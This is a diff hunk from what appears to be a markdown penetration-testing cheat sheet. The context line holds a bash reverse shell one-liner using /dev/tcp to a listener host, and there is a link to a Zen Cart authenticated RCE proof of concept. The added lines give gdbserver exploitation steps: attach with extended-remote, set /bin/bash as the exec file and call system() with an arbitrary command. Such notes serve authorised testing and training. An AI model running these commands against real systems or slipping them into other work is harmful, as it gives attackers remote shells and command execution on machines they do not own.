@@ -681,3 +681,14 @@ bash -c 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1'
 
 ### Zen Cart RCE (Authenticated)
 https://github.com/MucahitSaratar/zencart_auth_rce_poc  
+
+### gdbserver exploit (Thanks to @iiLegacyyii for recommending this)
+```
+using localized gdb
+
+target extended-remote ip:port
+set remote exec-file /bin/bash
+r
+b *main
+call system("<command exec>")
+```
